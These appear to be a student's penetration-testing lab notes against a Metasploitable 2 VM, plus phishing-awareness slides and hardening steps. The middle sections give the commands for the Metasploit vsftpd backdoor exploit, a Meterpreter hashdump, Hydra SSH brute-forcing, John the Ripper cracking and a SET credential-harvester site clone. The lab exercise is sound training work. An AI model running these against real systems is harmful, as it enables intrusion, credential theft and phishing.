## 1. Install a Hypervisor

Choose one:

- [Oracle VirtualBox](https://www.virtualbox.org?utm_source=chatgpt.com) (free)
- [VMware Workstation](https://www.vmware.com/products/workstation-pro.html?utm_source=chatgpt.com)

Install it and reboot if prompted.

---

## 2. Download Kali Linux

Download the VirtualBox or VMware image from:

- [Kali Linux Downloads](https://www.kali.org/get-kali/?utm_source=chatgpt.com)

Import the downloaded appliance into your hypervisor.

---

## 3. Download Metasploitable 2

Download the intentionally vulnerable VM from:

- [Metasploitable 2 Download (Rapid7)](https://sourceforge.net/projects/metasploitable/?utm_source=chatgpt.com)

Extract the archive and import/open the VM in VirtualBox or VMware.

---

## 4. Configure Networking

### Option A (Recommended): Host-Only Adapter

This is the safest option because the VMs can communicate with each other but are isolated from the Internet.

For **both VMs**:

- Open **Settings → Network**
- Adapter 1
    - Enable Network Adapter
    - Attached to: **Host-Only Adapter**
    - Select the default Host-Only network (for example `vboxnet0` in VirtualBox)

---

## 5. Boot Both Machines

Start:

1. Metasploitable 2
2. Kali Linux

Default Metasploitable credentials:

- Username: `msfadmin`
- Password: `msfadmin`

---

## 6. Find the Target IP Address

On **Metasploitable 2**, run:

```
ip addr
```

or

```
ifconfig
```

Look for an IPv4 address such as:

```
192.168.56.101
```
![[Screenshot From 2026-07-09 23-28-05 1.png]]
or

```
10.0.2.15
```

Record this IP in your notes.

---

## 7. Verify Connectivity

From **Kali Linux**, test communication:

```
ping 192.168.56.102
```

Example:  metasploitable

```
ping 192.168.56.101
```

You should receive replies.
![[Screenshot From 2026-07-09 23-28-05 2.png]]
---

## 8. Start Your Lab Log

Create a file named:

```
lab-log.md
```

Example contents:

```
# Penetration Testing Lab

**Date:** July 9, 2026

## Environment

Hypervisor:
- VirtualBox 7.x

Attacker Machine:
- Kali Linux

Target Machine:
- Metasploitable 2

Network Mode:
- Host-Only

## Target Information

Target IP:
- 192.168.56.101

## Milestones

- [ ] Kali imported
- [ ] Metasploitable imported
- [ ] Network configured
- [ ] Target IP identified
- [ ] Connectivity verified

## Notes

Both virtual machines can communicate successfully.
```

---![[Pasted image 20260709233523.png]]

## Step 2: Exploitation with Metasploit

This phase covers the standard core pentesting steps: **Recon $\rightarrow$ Scanning $\rightarrow$ Exploitation $\rightarrow$ Post-Exploitation**.

- **Reconnaissance & Scanning:**
    
    1. Find your target's IP address (e.g., using `netdiscover` or checking the Metasploitable terminal via `ifconfig`).
        
    2. Run a detailed Nmap scan to find open ports and services:
        
        Bash
        
        ```
        nmap -sV -sC -O 192.168.56.102
        ```

![[Screenshot From 2026-07-09 23-54-22.png]]
- **Exploitation:**
    
    1. Launch the Metasploit Framework: 

```
	msfconsole
```

    1. Look for a well-known vulnerability on Metasploitable 2 (such as the infamous VSFTPD 2.3.4 backdoor or UnrealIRCd). Let's use `vsftpd` as a classic example:

        
        ```
        search vsftpd
    
        use exploit/unix/ftp/vsftpd_234_backdoor
        
        set RHOSTS 192.168.56.102

		set LHOST 192.168.56.101
		
        exploit
        ```

![[Pasted image 20260711120740.png]]
    2. If successful, this will drop you into a command shell or establish a **reverse shell/Meterpreter session**.

# Post-Exploitation:

- Once you have access, gather information about the target system:
    
    Bash
    
    ```
    sysinfo
    ```

![[Screenshot From 2026-07-11 13-05-59.png]]


- Dump the user password hashes to crack later:
    
    Bash
    
    ```
    hashdump
    ```
![[Screenshot From 2026-07-11 13-00-36.png]]



    _(Save these outputted hashes into a text file named `hashes.txt` on your Kali_

![[Pasted image 20260711130852.png]]


## Step 3: Password Attacks

- **Brute-force SSH using Hydra:** If you want to attack the SSH service instead of using Metasploit directly, use a wordlist (like Kali's default `rockyou.txt`) to guess credentials:
    
    Bash
    
    ```
    hydra -l root -P root ssh://192.168.56.101
    ```

![[Screenshot From 2026-07-11 14-06-53.png]]

- **Crack Hashed Passwords with John the Ripper:** Take the text file containing the hashes you dumped earlier via Metasploit (`hashes.txt`) and run John the Ripper against it:
    
    Bash
    
    ```
    john --format=descrypt hashes.txt
    
    ```
    
    # Or simply let John auto-detect:

    ```
    john hashes.txt
    ```
    
    View cracked passwords using 
    
```
john --show hashes.txt
```

![[Pasted image 20260711145857.png]]


## Step 4: Social Engineering (Simulation Only)

- **Create a Phishing Simulation Page:**
    
    1. Launch the **Social-Engineer Toolkit (SET)** by typing  in your Kali terminal.

```
setoolkit
```


    1. Choose `1) Social-Engineering Attacks` $\rightarrow$ `2) Website Attack Vectors` $\rightarrow$ `3) Credential Harvester Attack Method` $\rightarrow$ `2) Site Cloner`.

![[Pasted image 20260711155343.png]]


	1. Input your Kali Linux IP address when prompted, and then input a simple URL to clone (like a basic login page).

![[Pasted image 20260711155454.png]]


# Awareness Training: How to Detect Fake Phishing URLs

## Slide 1: Check the Website URL Carefully

- Always verify the domain name before entering any information.
- Attackers may create URLs that look similar to legitimate websites.
- Look for:
    - Spelling mistakes in the domain name.
    - Extra words added before or after the company name.
    - Unusual domain extensions.

**Example:**

Legitimate:  
```
company.com
```


Suspicious:  

```
company-login-security.com
```


---

## Slide 2: Be Careful with Urgent Messages

- Phishing messages often create a sense of urgency or fear.
- Be cautious with messages like:
    - "Your account will be closed immediately."
    - "Verify your details within 10 minutes."
    - "You have won a reward, click here."
- Always verify the request through an official channel.

---

## Slide 3: Verify Website Security

- HTTPS and the lock icon only indicate that the connection is encrypted.
- HTTPS does not guarantee that a website is legitimate.
- Check:
    - Correct website domain.
    - Valid company address.
    - Unexpected login requests.

## Key Security Practices

- Do not click unknown links.
- Enable Multi-Factor Authentication (MFA).
- Report suspicious emails or websites.
- Confirm unusual requests before taking action.

## Step 5: Malware Basics

- **Static vs. Dynamic Analysis Study:** In your report, define the difference:
    
    - _Static Analysis:_ Examining code, strings, and PE headers without executing the binary.
        
    - _Dynamic Analysis:_ Observing the behavior of a file (registry changes, network traffic) _during_ execution.
        
- **Analyze a Benign Sample in a Sandbox:**
    
    1. Use an isolated environment like a separate Windows/Linux VM without internet access, or use safe simulated binaries.
        
    2. Run tools like `strings <filename>` or upload a harmless mock sample to an internal tracking tool to analyze file hashes (MD5/SHA256).

## Step 6: System Hardening (Mitigation)

Log into your Metasploitable/Target environment directly to perform basic defensive actions:

- **Apply Security Patches:** Update system packages (`sudo apt-get update && sudo apt-get upgrade`).
    
- **Configure Firewall:** Setup basic rules using `iptables` or `ufw` to block unauthorized access to unnecessary ports (like closing port 21 if FTP isn't required).
    
- **Disable Unused Services:** Turn off vulnerable services:
    
    Bash
    
    ```
    service vsftpd stop
    ```
    
```
 systemctl disable vsftpd
```

